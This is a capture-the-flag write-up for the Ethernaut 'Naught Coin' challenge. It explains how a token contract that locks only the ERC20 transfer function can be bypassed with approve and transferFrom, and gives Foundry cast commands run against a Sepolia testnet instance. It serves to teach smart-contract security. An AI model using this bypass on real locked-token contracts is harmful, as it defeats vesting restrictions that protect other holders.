---
layout: writeup
title: "Naught Coin"
level: "Intermediate"
category: "Ethernaut"
description: "Bypass a 10-year lock-up period by utilizing the ERC20 transferFrom function instead of the restricted transfer function."
---

## Analysis

The `NaughtCoin` contract implements an ERC20 token where the `transfer` function is overridden with a modifier called `lockTokens`. This modifier prevents you from transferring tokens for 10 years.

**The Flaw:**
The ERC20 standard has two ways to move tokens:
1.  `transfer(address _to, uint256 _value)`
2.  `approve(address _spender, uint256 _value)` followed by `transferFrom(address _from, address _to, uint256 _value)`



The `NaughtCoin` contract **only** applied the 10-year lock to the `transfer` function. It completely forgot to override or restrict the `transferFrom` function.

---

## Solution

You can solve this by acting as both the **Owner** and the **Spender**. You will "approve" yourself (or another address you own) to spend your tokens, then call `transferFrom` to bypass the `lockTokens` modifier.

**Step-by-Step:**

1.  **Check Balance:** Confirm you have 1,000,000 tokens (multiplied by decimals).
2.  **Approve yourself:** Grant yourself permission to spend your own tokens.
3.  **Transfer From:** Call `transferFrom` to send the tokens to a different address.


## Foundry Scripts

<pre class="plain-code"><code>
# 1. Get your current balance
cast call "$NAUGHT_INSTANCE" "balanceOf(address)(uint256)" "$PLAYER_ADDRESS" --rpc-url "$SEPOLIA_RPC_URL"

# 2. Approve yourself to spend your own tokens
cast send "$NAUGHT_INSTANCE" "approve(address,uint256)" "$PLAYER_ADDRESS" 1000000000000000000000000 --private-key "$PRIVATE_KEY" --rpc-url "$SEPOLIA_RPC_URL"

# 3. Transfer tokens using transferFrom
cast send "$NAUGHT_INSTANCE" "transferFrom(address,address,uint256)" "$PLAYER_ADDRESS" 0x000000000000000000000000000000000000dEaD 1000000000000000000000000 --private-key "$PRIVATE_KEY" --rpc-url "$SEPOLIA_RPC_URL"

# 4. Verify final balance
cast call "$NAUGHT_INSTANCE" "balanceOf(address)(uint256)" "$PLAYER_ADDRESS" --rpc-url "$SEPOLIA_RPC_URL"
</code></pre>
